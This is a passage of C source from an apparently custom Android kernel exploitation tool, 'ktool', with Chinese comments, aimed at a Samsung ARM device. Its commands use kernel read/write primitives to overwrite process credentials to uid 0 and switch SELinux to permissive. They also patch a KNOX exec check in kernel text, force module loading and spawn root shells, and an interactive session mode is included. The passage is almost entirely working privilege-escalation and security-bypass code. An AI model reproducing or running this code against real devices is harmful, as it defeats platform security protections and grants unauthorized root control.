			for (i = 0; i < len; i++)
				printf("%02x", after[i]);
		else
			printf("(读不到)");
		printf("\n");
		if (kwrite_buf(cred + 4 + woff, orig, len) != 0)
			printf("! 还原失败（cred+%d 已被改动）\n", 4 + woff);
		else
			printf("已还原原值\n");
		return 0;
	}

	/*
	 * P4.85 walk：指针链追踪。
	 * scan4 回答"谁存着 X"，walk 回答"顺着 X 走下去是什么"。
	 * 每步读 cur+off 的 32 位值，打印，再把它当作下一跳基址；
	 * 起点可以直接写符号名，省掉"先 sym 再抄地址"那一步。
	 */
	if (!strcmp(argv[1], "walk")) {
		struct p_hit hop[16];
		unsigned long offs[16], cur, start;
		unsigned char b[8];
		int nh = 0, dn = 32;
		const char *first, *stopped = 0;

		if (argc < 4) {
			fprintf(stderr,
				"usage: walk <sym|hexaddr> <off>... [-d dumpbytes]\n"
				"  例: walk init_task 0x2fc        （→ init_cred，并 dump）\n"
				"      walk init_task 0x2fc 0x4   （→ cred → uid）\n"
				"      walk 0xd2018440 0x2fc -d 64\n");
			return 1;
		}
		first = argv[2];
		if (!strncmp(first, "0x", 2) || !strncmp(first, "0X", 2)) {
			cur = strtoul(first + 2, NULL, 16);
		} else if (kt_sym_lookup(first, &cur) != 0) {
			fprintf(stderr, "起点既不是 0x 地址也不是已知符号：%s\n", first);
			return 1;
		}
		start = cur;
		for (i = 3; i < argc && nh < 16; i++) {
			unsigned long off;

			if (!strcmp(argv[i], "-d") && i + 1 < argc) {
				dn = atoi(argv[++i]);
				continue;
			}
			off = (!strncmp(argv[i], "+0x", 3)) ? strtoul(argv[i] + 1, NULL, 16)
							   : strtoul(argv[i], NULL, 0);
			if (nh > 0 && cur < 0xc0000000UL) {
				stopped = "上一跳不是内核指针，链路到此为止";
				break;
			}
			if (kread_buf(cur + off, b, 4) != 0) {
				printf("read fail @ 0x%08lx (base 0x%08lx + 0x%lx)\n",
				       cur + off, cur, off);
				return 2;
			}
			hop[nh].addr = cur + off;
			hop[nh].val = *(uint32_t *)b;
			hop[nh].base = 0;
			hop[nh].type = 0;
			hop[nh].name[0] = 0;
			offs[nh] = off;
			nh++;
			cur = *(uint32_t *)b;
		}
		kt_annotate(hop, nh);
		for (i = 0; i < nh; i++) {
			unsigned long base = i ? hop[i - 1].val : start;

			printf("0x%08lx +0x%-4lx = 0x%08lx: 0x%08lx", base, offs[i],
			       hop[i].addr, hop[i].val);
			if (hop[i].base && hop[i].val - hop[i].base <= 0x100000)
				printf("  %c%s+0x%lx", hop[i].type, hop[i].name,
				       hop[i].val - hop[i].base);
			printf("\n");
		}
		if (stopped)
			printf("  (%s)\n", stopped);
		if (dn > 0 && cur >= 0xc0000000UL) {
			unsigned char *buf = malloc(dn);
			int off;

			if (buf && kread_buf(cur, buf, dn) == 0) {
				printf("--- 0x%08lx (%d bytes) ---\n", cur, dn);
				for (off = 0; off < dn; off += 16) {
					int n = (dn - off > 16) ? 16 : (dn - off), k;

					printf("%08lx ", cur + off);
					for (k = 0; k < n; k++)
						printf("%02x%s", buf[off + k],
						       (k & 3) == 3 ? " " : "");
					for (; k < 16; k++)
						printf("%s", (k & 3) == 3 ? "   " : "  ");
					printf("|");
					for (k = 0; k < n; k++)
						printf("%c", isprint(buf[off + k])
								     ? buf[off + k] : '.');
					printf("|\n");
				}
			}
			free(buf);
		}
		return 0;
	}

	if (!strcmp(argv[1], "find")) {
		unsigned char b[64];
		unsigned long p, ih = g_t->init_task, cred = 0, rcred = 0;
		uint32_t next;
		int i, found = 0;

		if (argc < 3) { fprintf(stderr, "usage: find <comm>\n"); return 1; }
		if (kread(ih + (OFF_TASKS - 0x10), b, 64) != 0) return 2;
		next = *(uint32_t *)(b + 0x14);   /* prev：从尾部反向走 */      /* tasks.next */
		for (i = 0; i < 400 && next; i++) {
			p = next - OFF_TASKS;
			if (kread(p + (OFF_TASK_COMM - 4), b, 64) == 0 &&
			    !strncmp((char *)(b + 4), argv[2], strlen(argv[2]))) {
				printf("FOUND task=%08lx comm=%s\n", p, b + 4);
				found = 1;
				break;
			}
			if (kread(p + (OFF_TASKS - 0x10), b, 64) != 0) { printf("next-read fail i=%d p=%08lx\n", i, p); break; }
			next = *(uint32_t *)(b + 0x14);   /* prev：从尾部反向走 */
			printf("  [%d] p=%08lx next=%08x\n", i, p, next);
			if (next == ih + OFF_TASKS) break;
		}
		if (!found) { printf("not found after %d\n", i); return 2; }
		if (kread(p + OFF_TASK_REALCRED, b, 64) == 0) {
			rcred = *(uint32_t *)b;
			cred = *(uint32_t *)(b + 4);
			printf("real_cred=%08lx cred=%08lx\n", rcred, cred);
		}
		if (cred && kread(cred, b, 64) == 0) {
			for (i = 0; i < 64; i += 8)
				printf("cred+%02x: %08x %08x\n", i,
				       *(uint32_t *)(b + i), *(uint32_t *)(b + i + 4));
		}
		return 0;
	}

	if (!strcmp(argv[1], "boot")) {
		/*
		 * 一次 exploit 做完开机三件事，省掉多次重复：
		 *   1) lkmauth_bootmode = 2
		 *   2) permissive_map 全 1
		 *   3) 加载模块（此时当前进程已是 kernel 域 + uid0，exec insmod 后保持 kernel 域）
		 *
		 * 用法：ktool boot /system/lib/modules/ktool_mod.ko
		 */
		if (argc < 3) { printf("need module path\n"); return 1; }
		if (do_root() != 0) return 3;

		{
			/* kwrite 要求 len 是 8 的倍数（kwrite: bad len 4），必须写 8 字节 */
			uint32_t pair[2], old;

			if (kread(g_t->lkmauth_bootmode, pair, 8) != 0) {
				printf("bootmode read fail\n");
				return 3;
			}
			old = pair[0];
			pair[0] = 2;
			if (kwrite_verify(g_t->lkmauth_bootmode, pair, 8) != 0) {
				printf("bootmode write fail\n");
				return 3;
			}
			printf("bootmode=2 (was %u)\n", old);
		}

		if (do_permissive() != 0) return 3;

		/*
		 * 必须打 exec patch：c0012164 处的 KNOX 分支会拦 kernel 域的 exec。
		 * 不打的话下面 exec insmod 会 errno=13（实测）。
		 */
		if (do_patch_exec(1) != 0) return 3;
		printf("exec patch on\n");

		printf("boot: exec insmod %s\n", argv[2]);
		fflush(stdout);
		{
			char *av[3];
			av[0] = "/system/bin/insmod";
			av[1] = argv[2];
			av[2] = NULL;
			execv(av[0], av);
		}
		perror("execv insmod");
		return 4;
	}

	/*
	 * P4.85 promote：只提权、不 exec。
	 * root/pwn 的设计是"提权后立刻 exec 目标"，在会话里会把 REPL 替换掉；
	 * promote 补的就是"留在原地"的那一半，之后每条命令都以 uid 0 跑。
	 * 注意 SELinux 域不变（仍是 u:r:shell:s0），cap 满也不等于能碰 system_file。
	 */
	if (!strcmp(argv[1], "promote")) {
		if (getuid() == 0) {
			printf("already uid 0 (context 不变)\n");
			show_caps("caps:");
			return 0;
		}
		if (do_root() != 0)
			return 3;
		printf("promoted: uid=%d euid=%d\n", (int)getuid(), (int)geteuid());
		return 0;
	}

	/*
	 * P4.86-B5：把 cred 还原到 promote 之前。
	 * 只在本会话内有效（快照在内存里）：进程一退，改的就是别人可能复用的地址了。
	 * 还原前校验 task 的 comm 与 cred 指针，防止地址复用导致写错对象。
	 */
	if (!strcmp(argv[1], "unroot")) {
		unsigned char b[64];

		if (!g_cs.valid) {
			printf("本会话没有 cred 快照（要先 promote 一次）\n");
			return 1;
		}
		if (kread_buf(g_cs.task + (OFF_TASK_COMM - 4), b, 64) != 0 ||
		    strncmp((char *)(b + 4), "ktool", 5)) {
			printf("task 校验失败（0x%08lx 已不是本进程），拒绝还原\n",
			       g_cs.task);
			return 2;
		}
		if (kread_buf(g_cs.task + OFF_TASK_REALCRED, b, 8) != 0 ||
		    *(uint32_t *)(b + 4) != (uint32_t)g_cs.cred) {
			printf("cred 指针与快照不符（0x%08lx），拒绝还原\n", g_cs.cred);
			return 2;
		}
		/*
		 * P4.88：还原也用内核视角确认（getuid 回到快照里的 uid），
		 * 不信任读回。最多重试 3 次。
		 */
		{
			int t;

			for (t = 0; t < 6; t++) {
				kt_write_rb(g_cs.cred + 4, g_cs.credb, KT_CRED_SNAP);
				if (kt_cred_matches(g_cs.credb))
					break;
				printf("  #%d 次还原后 uid=%d euid=%d（期望 %u/%u），重试\n",
				       t + 1, (int)getuid(), (int)geteuid(),
				       kt_rd32(g_cs.credb), kt_rd32(g_cs.credb + 0x10));
			}
			if (!kt_cred_matches(g_cs.credb)) {
				printf("cred 还原失败（uid=%d euid=%d）\n", (int)getuid(),
				       (int)geteuid());
				return 3;
			}
		}
		if (g_cs.rcred &&
		    kwrite_buf(g_cs.rcred + 4, g_cs.rcredb, KT_CRED_SNAP) != 0)
			printf("! real_cred 还原失败（cred 已还原）\n");
		printf("unroot: uid=%d euid=%d gid=%d\n", (int)getuid(),
		       (int)geteuid(), (int)getgid());
		show_caps("caps:");
		return 0;
	}

	if (!strcmp(argv[1], "root") || !strcmp(argv[1], "pwn")) {
		int want_perm = !strcmp(argv[1], "pwn");

		fflush(stdout);
		if (do_root() != 0) return 3;
		if (want_perm && do_permissive() != 0) return 3;
		fflush(stdout);

		if (want_perm) {
			if (argc > 2) {
				int fd;
				errno = 0;
				fd = open(argv[2], O_RDONLY);
				printf("probe: open(%s)=%d errno=%d\n", argv[2], fd, errno);
				if (fd >= 0) close(fd);
				errno = 0;
				printf("probe: access(X_OK)=%d errno=%d uid=%d\n",
				       access(argv[2], X_OK), errno, (int)getuid());
				fflush(stdout);
				execvp(argv[2], &argv[2]);
				printf("execvp errno=%d\n", errno);
			} else {
				char *av[2];
				av[0] = "/system/bin/sh";
				av[1] = NULL;
				execv(av[0], av);
				perror("execv");
			}
			_exit(1);
		}
		if (argc > 2) {
			execvp(argv[2], &argv[2]);
			perror("execvp");
		}
		_exit(0);
	}



	if (!strcmp(argv[1], "x")) {
		execvp(argv[2], &argv[2]);
		printf("execvp errno=%d\n", errno);
		return 3;
	}


	/*
	 * sh —— root shell（P4.28 改）
	 *
	 * 旧行为是 do_root + do_permissive（**全开** permissive_map），代价很大：
	 * 全开后的判定会被 AVC 缓存，之后哪怕 permissive 清掉也一直有效，
	 * 相当于给整台机器留了个看不见的后门，重启才清。
	 *
	 * 新行为：do_root 拿 caps，然后借模块把域切成 init_shell（和 su 走同一条
	 * 路，同样过门禁），只在模块没加载时（比如第一次 insmod 之前）退回
	 * min permissive（仅 init_shell 1 个 bit）。
	 */
	if (!strcmp(argv[1], "sh")) {
		if (do_root() != 0) return 3;
		/*
		 * 顺序很关键（P4.29 实测）：**先打 patch，再切域**。
		 * 反过来（先 ctx 后 patch）会让 do_patch_exec 里的 kread 全部失败
		 * ——切到 init_shell 之后这条路读不动内核 text，稳定复现。
		 * 打 patch 只是写 kernel text，不依赖域，所以放前面没有副作用。
		 */
		if (do_patch_exec(1) != 0) return 3;
		if (do_ctx("ctx u:r:init_shell:s0") != 0) {
			printf("note: module absent, fallback to min permissive\n");
			if (do_permissive_min() != 0) return 3;
		}
		fflush(stdout);
		{
			char *av[64];
			int n = 0, k;

			av[n++] = "/system/bin/sh";
			for (k = 2; k < argc && n < 63; k++)
				av[n++] = argv[k];
			av[n] = NULL;
			execv(av[0], av);
		}
		printf("exec errno=%d\n", errno);
		return 3;
	}

	/* shfull —— 旧的 sh：do_root + 全开 permissive。只在 sh 搞不定时用，
	 * 用完务必 enforce 或重启，别停在半开状态。 */

	if (!strcmp(argv[1], "ls") || !strcmp(argv[1], "cat") ||
	    !strcmp(argv[1], "cp")) {
		int isls = !strcmp(argv[1], "ls");
		int iscat = !strcmp(argv[1], "cat");

		if (do_root() != 0) return 3;
		if (do_permissive() != 0) return 3;
		fflush(stdout);

		if (isls) {
			DIR *d = opendir(argv[2]);
			struct dirent *e;
			if (!d) { printf("opendir: %d\n", errno); return 3; }
			while ((e = readdir(d)))
				printf("%s\n", e->d_name);
			closedir(d);
			return 0;
		}
		if (iscat) {
			int fd = open(argv[2], O_RDONLY), n;
			char buf[4096];
			if (fd < 0) { printf("open: %d\n", errno); return 3; }
			while ((n = read(fd, buf, sizeof(buf))) > 0) {
				if (write(1, buf, n) != n) break;
			}
			close(fd);
			return 0;
		}
		{
			int in = open(argv[2], O_RDONLY);
			int out, n;
			char buf[8192];
			if (in < 0) { printf("open src: %d\n", errno); return 3; }
			out = open(argv[3], O_WRONLY | O_CREAT | O_TRUNC, 0666);
			if (out < 0) { printf("open dst: %d\n", errno); return 3; }
			while ((n = read(in, buf, sizeof(buf))) > 0) {
				if (write(out, buf, n) != n) { printf("write fail\n"); break; }
			}
			close(in); close(out);
			chmod(argv[3], 0755);
			printf("copied\n");
			return 0;
		}
	}

	if (!strcmp(argv[1], "rawexec")) {
		unsigned char b[64];
		unsigned long p2, c2;
		uint32_t ids[8] = {0};
		char *av[2];
		int k;

		if (!strcmp(argv[2], "root")) {
			p2 = find_self();
			if (!p2) { printf("task not found\n"); return 3; }
			if (kread(p2 + OFF_TASK_REALCRED, b, 64) != 0) return 3;
			c2 = *(uint32_t *)(b + 4);
			for (k = 0; k < 8; k++) ids[k] = 0;
			kwrite_verify(c2 + 4, ids, 32);
			printf("uid=%d\n", (int)getuid());
			argv[2] = argv[2];   /* no-op */
			av[0] = argv[3];
			av[1] = NULL;
			syscall(__NR_execve, argv[3], av, environ);
			printf("rawexec errno=%d\n", errno);
			return 0;
		}
		av[0] = argv[2];
		av[1] = NULL;
		syscall(__NR_execve, argv[2], av, environ);
		printf("rawexec errno=%d\n", errno);
		return 0;
	}

	if (!strcmp(argv[1], "who")) {
		printf("who: uid=%d euid=%d gid=%d egid=%d\n",
		       (int)getuid(), (int)geteuid(), (int)getgid(), (int)getegid());
		show_caps("who caps");
		return 0;
	}

	if (!strcmp(argv[1], "w32")) {
		unsigned long a = strtoul(argv[2], NULL, 16);
		uint32_t v = strtoul(argv[3], NULL, 0);
		unsigned char b[8];
		uint32_t pair[2];

		if (kread(a, b, 8) != 0) { printf("read fail\n"); return 3; }
		pair[0] = v;
		pair[1] = *(uint32_t *)(b + 4);
		if (kwrite_verify(a, pair, 8) != 0) { printf("write fail\n"); return 3; }
		printf("%08lx <= %08x (was %08x)\n", a, v, *(uint32_t *)b);
		return 0;
	}



	if (!strcmp(argv[1], "caps")) {
		unsigned char b[64];
		unsigned long p2, c2;
		uint32_t f = 0xffffffffU;
		uint32_t offs[] = {0x28,0x2c,0x30,0x34,0x38,0x3c,0x40,0x44};
		uint32_t save[8];
		int k;

		p2 = find_self();
		if (!p2) { printf("task not found\n"); return 3; }
		if (kread(p2 + OFF_TASK_REALCRED, b, 64) != 0) return 3;
		c2 = *(uint32_t *)(b + 4);
		printf("cred=%08lx\n", c2);
		show_caps("before");
		for (k = 0; k < 8; k++) {
			uint32_t pair[2];

			if (kread(c2 + offs[k], b, 8) != 0) continue;
			save[k] = *(uint32_t *)b;
			pair[0] = f;
			pair[1] = *(uint32_t *)(b + 4);   /* 保留相邻 4 字节 */
			if (kwrite_verify(c2 + offs[k], pair, 8) != 0) {
				printf("  +%02x write fail\n", offs[k]);
				continue;
			}
			printf("  +%02x was %08x -> ", offs[k], save[k]);
			show_caps("    ");
			pair[0] = save[k];
			if (kwrite_verify(c2 + offs[k], pair, 8) != 0)
				printf("  restore fail\n");
		}
		show_caps("after");
		return 0;
	}

	if (!strcmp(argv[1], "patch")) {
		if (do_root() != 0) return 3;
		return do_patch_exec(1) == 0 ? 0 : 3;
	}

	if (!strcmp(argv[1], "unpatch")) {
		if (do_root() != 0) return 3;
		return do_patch_exec(0) == 0 ? 0 : 3;
	}


	if (!strcmp(argv[1], "enforce") || !strcmp(argv[1], "unperm") ||
	    !strcmp(argv[1], "restore")) {
		/*
		 * enforce（P4.88 起的主名；unperm / restore 保留为别名——
		 * init.sec.boot.v9{e,f,g}.sh 里有 3 处 /system/bin/ktool restore）
		 *
		 *   ktool enforce           关 permissive + 清 AVC 缓存
		 *   ktool enforce --noflush 只关 permissive（诊断开关）
		 *
		 * 原来还有 --stock（连 exec patch 一起撤），已删除：
		 * 它等于 `ktool unpatch && ktool enforce`，而 unpatch 本来就是
		 * 独立命令，没必要在 enforce 上再开一个"把机器弄瘫"的暗道。
		 *
		 * 撤 exec patch 的后果（P4.89 真机实测，不要再照抄旧说法）：
		 *   有 patch：root exec 正常（sh/id/ls 都是以 uid 0 跑）
		 *   撤 patch：sh   → execvp: Permission denied
		 *             id/ls → exec 成功但进程回落 uid=2000（root 丢失）
		 * 也就是说不是"所有 root exec 都被 EACCES 挡掉"，而是
		 * **特权能力没了**：要么拒，要么降权。观察类命令（dump/who/dis/
		 * fld/sym，不做 exec）照常可用；恢复只需再跑 `ktool patch`，
		 * 它是纯内核写，不依赖 exec，所以这个门**不是单向的**。
		 */
		int flush = 1, k;

		for (k = 2; k < argc; k++) {
			if (!strcmp(argv[k], "--noflush"))
				flush = 0;
			else if (!strcmp(argv[k], "--flush"))
				flush = 1;
			else if (!strcmp(argv[k], "--stock"))
				printf("note: --stock 已删除（P4.88）——"
				       "它等于 unpatch + enforce，而 unpatch 是独立命令\n");
		}
		if (do_root() != 0) return 3;

		if (do_unperm() != 0) return 3;
		if (!flush) {
			/*
			 * P4.89 E4 实测：map 清空但缓存保留时，
			 *   mount -o remount /system 仍然成功（ro_rc=0）
			 * —— 缓存里 avc_denied 走过 AVC_CALLBACK_GRANT 的那条
			 * 记录已经把 requested 位 OR 进 allowed，之后连
			 * permissive 判定都不再走。所以这不是"部分还原"，
			 * 而是**根本没还原**。
			 */
			printf("note: --noflush：permissive_map 已清零，但 AVC 缓存未清\n"
			       "      缓存里已被授权的三元组仍会放行（P4.89 E4 实测：\n"
			       "      remount /system 依然成功）——**并未真正恢复强制**\n"
			       "      要真正恢复请去掉 --noflush 重跑\n");
			return 0;
		}
		/* 清 AVC 缓存，让 permissive 清零立刻对**所有**三元组生效。
		 * 代价见 do_ctx("avcflush") 上面的告警：P4.12 实测
		 * audit backlog 爆掉 → RST_STAT=0x200 复位。
		 * 注意 P4.88 §七 已重新定性：复位是 ktool_stop_auditd() 造成的，
		 * 消费者活着时 avc_ss_reset 无风暴。 */
		if (do_ctx("avcflush") != 0) {
			/*
			 * P4.89：这里必须非 0 返回且把后果说准。
			 * 原来的文案是"彻底恢复请重启"，会让人以为已经还原了大半；
			 * 实际是：map 清了，但缓存里的授权照旧放行 —— 机器表面
			 * Enforcing，行为仍是 permissive。
			 */
			printf("! avcflush 不可用（模块未加载？）\n"
			       "  permissive_map 已清零，但 AVC 缓存未清 ——\n"
			       "  已缓存的三元组仍按旧授权放行，当前**并未恢复强制**\n"
			       "  修法：insmod ktool_mod.ko 后重跑 enforce（或 flush），不要靠重启\n");
			return 4;
		}
		printf("avc cache flushed: permissive 立即全部失效\n");
		return 0;
	}

	/* flush —— 只清 AVC 缓存（permissive 状态不变）。
	 * 典型用途：先 permissive 设好，再 flush，让之前被缓存下来的拒绝作废。 */
	if (!strcmp(argv[1], "flush")) {
		/*
		 * P4.88 §七 已重新定性：P4.12 那次 RST_STAT=0x200 复位是
		 * ktool_stop_auditd() 主动杀了 auditd 造成的，不是 flush 本身。
		 * 消费者（auditd / kauditd）活着时实测无风暴。
		 * 只有当 auditd 被杀 **且** SecurityLogAgent 被禁 两个条件
		 * 同时成立，backlog 才会爆。所以这里只提示，不再吓人。
		 */
		int yes = 0, k;

		for (k = 2; k < argc; k++) {
			if (!strcmp(argv[k], "-y") || !strcmp(argv[k], "--yes"))
				yes = 1;
		}
		if (do_root() != 0) return 3;

		if (!yes) {
			printf("! flush 会清空 AVC 缓存，之后所有检查重算；\n"
			       "  auditd 活着时无风暴（P4.88 §七 实测），\n"
			       "  但若 auditd 已被杀且 SecurityLogAgent 被禁，可能撑爆 backlog。\n"
			       "  -y 跳过等待\n");
			fflush(stdout);
			sleep(3);
		}
		if (do_ctx("avcflush") != 0) {
			printf("flush failed: /dev/ktool 不可用（模块未加载）\n");
			printf("  可用 flush --policy 走策略重载（需 permissive_map 开着）\n");
			return 4;
		}
		printf("avc cache flushed\n");
		return 0;
	}

	if (!strcmp(argv[1], "permissive")) {
		/* permissive [bit]：不带参数用表里 init_shell 的 type value */
		if (argc > 2)
			g_perm_bit = (unsigned int)strtoul(argv[2], NULL, 0);
		return do_permissive_min() == 0 ? 0 : 3;
	}

	if (!strcmp(argv[1], "showcred")) {
		unsigned char b[64];
		unsigned long p, ih = g_t->init_task, cred = 0;
		uint32_t next;
		int i;

		if (kread(ih + (OFF_TASKS - 0x10), b, 64) != 0) return 2;
		next = *(uint32_t *)(b + 0x14);   /* prev：从尾部反向走 */
		for (i = 0; i < 400 && next; i++) {
			p = next - OFF_TASKS;
			if (kread(p + (OFF_TASK_COMM - 4), b, 64) == 0 &&
			    !strncmp((char *)(b + 4), "ktool", 5)) break;
			if (kread(p + (OFF_TASKS - 0x10), b, 64) != 0) return 2;
			next = *(uint32_t *)(b + 0x14);   /* prev：从尾部反向走 */
			if (next == ih + OFF_TASKS) { next = 0; break; }
			if (i > 390) break;
		}
		if (!next) { printf("not found\n"); return 2; }
		if (kread(p + OFF_TASK_REALCRED, b, 64) != 0) return 2;
		cred = *(uint32_t *)(b + 4);
		printf("task=%08lx cred=%08lx\n", p, cred);
		for (i = 0; i < 0x80; i += 8) {
			if (kread(cred + i, b, 8) != 0) { printf("+%02x fail\n", i); continue; }
			printf("  +%02x: %08x %08x\n", i, *(uint32_t *)b, *(uint32_t *)(b+4));
		}
		for (i = 0x48; i < 0x68; i += 4) {
			uint32_t v;
			unsigned char c[16];
			if (kread(cred + i, b, 8) != 0) continue;
			v = *(uint32_t *)b;
			if (v < 0xc0000000UL) continue;
			printf("ptr +%02x=%08x ->", i, v);
			if (kread(v, c, 16) == 0)
				printf(" %08x %08x %08x %08x\n",
				       *(uint32_t *)c, *(uint32_t *)(c+4),
				       *(uint32_t *)(c+8), *(uint32_t *)(c+12));
			else printf(" (read fail)\n");
		}
		return 0;
	}

	if (!strcmp(argv[1], "selftest")) {
		unsigned char b[64];
		unsigned long a;
		int k;

		if (argc < 3) { fprintf(stderr, "usage: selftest <hexaddr>\n"); return 1; }
		a = strtoul(argv[2], NULL, 16);
		for (k = 0; k < 4; k++) {
			if (kread(a, b, 64) != 0) printf("read %d FAIL\n", k);
			else printf("read %d: %08x %08x %08x %08x\n", k,
				    *(uint32_t *)b, *(uint32_t *)(b+4),
				    *(uint32_t *)(b+8), *(uint32_t *)(b+12));
			fflush(stdout);
		}
		return 0;
	}

	/*
	 * 兜底守卫（P4.89 补）：dump/read 是 dispatch 的最后一个分支，
	 * 任何没匹配上的命令都会掉进它的 else 变成"读地址 0"，
	 * 输出一句莫名其妙的 "read failed"。这里显式拦掉。
	 */
	if (strcmp(argv[1], "dump") && strcmp(argv[1], "read")) {
		fprintf(stderr, "unknown command: %s（repl 里输 help 看用法）\n",
			argv[1]);
		return 1;
	}

	if (!strcmp(argv[1], "dump")) {
		unsigned char buf[256];
		int off;

		for (off = 0; off < len; off += 64) {
			int n = (len - off > 64) ? 64 : (len - off);
			/* kread_buf 吃任意长度：底下的 backend 要求 8 的倍数，
			 * 这里补齐后多读的字节会被丢掉，不会写到 buf 之外 */
			if (kread_buf(addr + off, buf, n) != 0) {
				printf("%08lx  <read failed>\n", addr + off);
				fflush(stdout);
				continue;
			}
			printf("%08lx ", addr + off);
			for (i = 0; i < n; i++) {
				printf("%02x", buf[i]);
				if ((i & 3) == 3) printf(" ");
			}
			printf("\n");
			fflush(stdout);
		}
	} else {
		unsigned char *buf = malloc(len);
		if (!buf) return 1;
		if (kread_buf(addr, buf, len) != 0) {
			fprintf(stderr, "read failed\n");
			return 2;
		}
		fwrite(buf, 1, len, stdout);
	}
	return 0;
}

/* ======================================================================
 * P4.85：会话模式
 *
 * 痛点（P4.82 #10）：每条命令都是新进程 —— 2s 精灵预热、pipe/mmap 重建、
 * 400 次链表遍历找自己的 task，全都要重付一遍；更麻烦的是 `showcred`
 * 拿到的堆地址换个进程就失效，没法做到"读一次、后面接着用"。
 *
 * 会话模式：backend 只初始化一次，之后逐行读命令走同一套 dispatch。
 *   - `promote` 升的权限对后续命令持续有效（root/pwn 会 exec，用完会话就没了）；
 *   - find_self 结果带 comm 校验地缓存；
 *   - stdin 不是 tty 时不打提示符，可以直接 `ktool repl < script.txt` 批处理。
 * ==================================================================== */

static void kt_repl_help(void)
{
	printf(
	"  target | backend [probe]        机型表 / 后端自检\n"
	"  sym <name|0xaddr> [-a] [-n N]   符号查询\n"
	"  dump <addr> <len> | read ...    读并 hexdump / 裸二进制\n"
	"  kread_file | kwrite_file | w32  大块读写 / 单值写\n"
	"  undo                            用 undo 日志还原上次写入\n"
	"  scan | scan4 | findcred         字节串 / 指针 / cred 形状搜索\n"
	"  walk <sym|addr> <off>...        指针链追踪（终点自动 dump）\n"
	"  fld <addr> <off:type>...        按字段读结构\n"
	"  dis <addr> [n]                  ARM32 反汇编（保守解码）\n"
	"  find <comm>                     遍历 task 链表；另有 who/caps/showcred\n"
	"  bench [addr] [n] | selftest     读吞吐 / 读自检\n"
	"  wtest [len] [off]               写原语落地诊断\n"
	"  promote | unroot                提权但留在会话 / 用快照还原 cred\n"
	"  enforce [--noflush]             关 permissive + 清 AVC（别名 unperm / restore）\n"
	"                                  --noflush = 未真正恢复，仅诊断用\n"
	"  flush [-y]                      只清 AVC 缓存（-y 跳过等待）\n"
	"  patch | unpatch                 KNOX exec 检查块；撤了只是失去特权，可再 patch\n"
	"  root <cmd>                      提权后 exec（别名 x / rawexec）—— 会结束会话\n"
	"  pwn <cmd>                       提权 + 全开 permissive 后 exec\n"
	"  sh                              打 patch + 切 init_shell 后给 shell\n"
	"  boot <ko>                       bootmode=2 + permissive + insmod\n"
	"  repl                            交互会话（别名 shell / -i）\n"
	"  quit | exit                     退出\n");
}

/* 空白分隔切词；av[0] 固定放 "ktool"，让 dispatch 继续用 argv[1] 当命令名。
 * 返回 argc（含占位的那一个）。不支持引号——路径里别带空格。 */
static int kt_split(char *line, char *av[], int max)
{
	char *p;
	int n = 1;

	av[0] = (char *)"ktool";
	for (p = strtok(line, " \t\r\n"); p && n < max - 1; p = strtok(NULL, " \t\r\n"))
		av[n++] = p;
	return n;
}

static char g_hist[16][256];
static int g_histn;

/*
 * REPL 历史持久化。
 *
 * 原来只有进程内 16 条，exec 一次（root/sh/x）就全丢 —— 而 REPL 里
 * 最常用的就是「先 dump 再看，然后 root」。落盘成本极低，直接做掉。
 *
 * 每次 add 追加写、启动时读回最后 16 条：不用 atexit（exec 不会触发），
 * 也不用担心异常退出丢历史。写失败（比如当前是 init_shell 域，
 * 对 shell_data_file 没有 write）就静默降级成纯内存历史。
 */
#define KT_HIST_FILE "/data/local/tmp/.ktool_hist"

static void kt_hist_load(void)
{
	FILE *f = fopen(KT_HIST_FILE, "r");
	char line[256];
	int n = 0;

	if (!f)
		return;
	while (fgets(line, sizeof(line), f)) {
		line[strcspn(line, "\r\n")] = 0;
		if (!line[0])
			continue;
		snprintf(g_hist[n % 16], sizeof(g_hist[0]), "%s", line);
		n++;
	}
	fclose(f);
	/* n 可能溢出 int；历史文件由我们自己写，正常不会到百万行 */
	if (n > 1000000)
		n = 16;
	g_histn = n;
}

static void kt_hist_add(const char *line)
{
	FILE *f;

	if (g_histn && !strcmp(g_hist[(g_histn - 1) % 16], line))
		return;
	snprintf(g_hist[g_histn % 16], sizeof(g_hist[0]), "%s", line);
	g_histn++;
	f = fopen(KT_HIST_FILE, "a");
	if (f) {
		fprintf(f, "%s\n", g_hist[(g_histn - 1) % 16]);
		fclose(f);
	}
}

static int ktool_repl(void)
{
	char line[1024], raw[1024];
	char *av[24];
	int n, i, rc = 0, tty = isatty(0);

	kt_hist_load();

	printf("ktool session: backend=%s target=%s\n",
	       g_krw ? g_krw->name : "(none)", g_t ? g_t->model : "?");
	printf("help 看命令；history / !N 回放；root/sh/x 会 exec 并结束会话。\n");

	for (;;) {
		if (tty) {
			printf("ktool> ");
			fflush(stdout);
		}
		if (!fgets(line, sizeof(line), stdin))
			break;
		snprintf(raw, sizeof(raw), "%s", line);
		n = kt_split(line, av, 24);
		if (n < 2)
			continue;
		if (!strcmp(av[1], "quit") || !strcmp(av[1], "exit") ||
		    !strcmp(av[1], "q"))
			break;
		if (!strcmp(av[1], "help") || !strcmp(av[1], "?")) {
			kt_repl_help();
			continue;
		}
		if (!strcmp(av[1], "history") || !strcmp(av[1], "h")) {
			int lo = g_histn > 16 ? g_histn - 16 : 0;

			for (i = lo; i < g_histn; i++)
				printf("%3d  %s", i + 1, g_hist[i % 16]);
			continue;
		}
		if (av[1][0] == '!' && av[1][1] >= '0' && av[1][1] <= '9') {
			int k = atoi(av[1] + 1) - 1;

			if (k < 0 || k >= g_histn || g_histn - k > 16) {
				printf("无此历史条目\n");
				continue;
			}
			printf("!%d  %s", k + 1, g_hist[k % 16]);
			fflush(stdout);
			snprintf(line, sizeof(line), "%s", g_hist[k % 16]);
			n = kt_split(line, av, 24);
			if (n < 2)
				continue;
		} else {
			kt_hist_add(raw);
		}
		fflush(stdout);
		spin_active = 1;	/* 放行精灵，留一点预热时间再发命令 */
		usleep(80000);
		rc = ktool_dispatch(n, av);
		spin_active = 0;
		fflush(stdout);
	}
	return rc;
}

